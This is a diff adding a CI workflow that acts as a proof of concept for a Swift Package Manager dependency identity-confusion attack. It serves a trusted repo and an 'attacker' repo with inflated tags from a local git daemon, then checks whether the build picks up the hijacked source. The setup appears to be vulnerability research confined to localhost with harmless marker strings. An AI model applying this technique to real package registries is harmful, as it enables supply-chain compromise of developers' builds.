@@ -1,0 +1,76 @@
+name: CI
+on: [push]
+jobs:
+  git-005:
+    name: Dependency resolution
+    runs-on: ubuntu-latest
+    steps:
+      - uses: swift-actions/setup-swift@v2
+        with:
+          swift-version: '6.0'
+      - name: Identity confusion
+        run: |
+          set -e
+          WORK=$(mktemp -d)
+          git config --global user.name "CI" && git config --global user.email "ci@test"
+          mkdir -p $WORK/repos/trusted $WORK/repos/attacker
+
+          mkdir -p $WORK/tw/Sources/TrustedLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/tw/Package.swift
+          echo 'public let sharedValue = "TRUSTED-LEGITIMATE-SOURCE"' > $WORK/tw/Sources/TrustedLib/Lib.swift
+          cd $WORK/tw && git init -q -b main && git add -A && git commit -qm init && git tag 1.0.0
+          git clone -q --bare $WORK/tw $WORK/repos/trusted/shared.git
+          touch $WORK/repos/trusted/shared.git/git-daemon-export-ok
+
+          mkdir -p $WORK/aw/Sources/TrustedLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/aw/Package.swift
+          echo 'public let sharedValue = "ATTACKER-HIJACKED-SOURCE"' > $WORK/aw/Sources/TrustedLib/Lib.swift
+          cd $WORK/aw && git init -q -b main && git add -A && git commit -qm init
+          for i in $(seq 0 30); do git tag "1.0.$i"; done
+          git clone -q --bare $WORK/aw $WORK/repos/attacker/shared.git
+          touch $WORK/repos/attacker/shared.git/git-daemon-export-ok
+
+          mkdir -p $WORK/cw/Sources/CarrierLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"carrier",products:[.library(name:"CarrierLib",targets:["CarrierLib"])],dependencies:[.package(url:"git://127.0.0.1/attacker/shared.git",from:"1.0.0")],targets:[.target(name:"CarrierLib")])\n' > $WORK/cw/Package.swift
+          echo 'public enum CarrierLib {}' > $WORK/cw/Sources/CarrierLib/Lib.swift
+          cd $WORK/cw && git init -q -b main && git add -A && git commit -qm init && git tag 1.0.0
+          git clone -q --bare $WORK/cw $WORK/repos/carrier.git
+          touch $WORK/repos/carrier.git/git-daemon-export-ok
+
+          git daemon --reuseaddr --base-path=$WORK/repos --export-all --port=9418 &
+          sleep 1
+
+          mkdir -p $WORK/root/Sources/App
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"root",dependencies:[.package(url:"git://127.0.0.1/trusted/shared.git",from:"1.0.0"),.package(url:"git://127.0.0.1/carrier.git",from:"1.0.0")],targets:[.executableTarget(name:"App",dependencies:[.product(name:"TrustedLib",package:"shared"),.product(name:"CarrierLib",package:"carrier")])])\n' > $WORK/root/Package.swift
+          echo 'import TrustedLib; print(sharedValue)' > $WORK/root/Sources/App/main.swift
+
+          echo "Trusted tags: $(git -C $WORK/repos/trusted/shared.git tag | wc -l)"
+          echo "Attacker tags: $(git -C $WORK/repos/attacker/shared.git tag | wc -l)"
+
+          echo "=== Fresh resolve + build ==="
+          swift build --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -15
+
+          echo "=== Runtime ==="
+          OUTPUT=$(swift run --package-path $WORK/root --scratch-path $WORK/scratch --skip-build 2>&1)
+          echo "output=$OUTPUT"
+
+          echo "=== Checkout ==="
+          cat $WORK/scratch/checkouts/shared/Sources/TrustedLib/Lib.swift 2>/dev/null
+          echo "remote=$(git -C $WORK/scratch/checkouts/shared remote get-url origin 2>/dev/null)"
+
+          echo "=== Resolved ==="
+          grep -A5 shared $WORK/root/Package.resolved 2>/dev/null | head -8
+
+          echo "=== Warnings ==="
+          grep -i "identity\|conflict\|warning" $WORK/scratch/*.log 2>/dev/null | head -5
+
+          echo "=== RESULT ==="
+          if echo "$OUTPUT" | grep -q "ATTACKER-HIJACKED"; then
+            echo "VULNERABLE: Attacker source replaced trusted via identity confusion"
+          elif echo "$OUTPUT" | grep -q "TRUSTED-LEGITIMATE"; then
+            echo "NOT VULNERABLE on this Swift version"
+          else
+            echo "UNKNOWN: output=$OUTPUT"
+          fi
+
+          kill $(jobs -p) 2>/dev/null || true
